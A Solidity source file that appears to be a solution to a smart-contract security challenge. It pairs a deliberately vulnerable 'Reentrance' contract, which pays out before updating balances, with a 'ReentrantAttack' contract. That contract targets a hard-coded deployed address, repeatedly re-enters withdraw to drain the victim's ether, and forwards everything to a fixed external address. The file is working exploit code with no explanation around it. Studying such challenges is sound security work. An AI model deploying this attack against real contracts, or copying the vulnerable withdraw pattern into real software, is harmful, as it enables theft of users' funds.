// SPDX-License-Identifier: MIT
pragma solidity 0.8.14;


contract Reentrance {
  
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to] + (msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}

contract ReentrantAttack {
    Reentrance reentrance;
    uint public attackAmount;

    constructor() {
        reentrance = Reentrance(payable(0x784a5fd5906AC2f24BAdBd05344386E90bD9b9A2));
    }

    receive() external payable {
        reentrance.withdraw(attackAmount);
    }
    
    fallback() external payable {
        withdraw();
    }


    function donate() public payable {
        attackAmount = msg.value;
        reentrance.donate{value: attackAmount}(address(this));
    }

    function attack() public {
        reentrance.withdraw(attackAmount);
        
    }

    function withdraw() public payable {
        address to = payable(0x0bae3B8E702eA3e9F85594ca69Baa9aA3f2F901B);
        (bool sent,) = to.call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }
}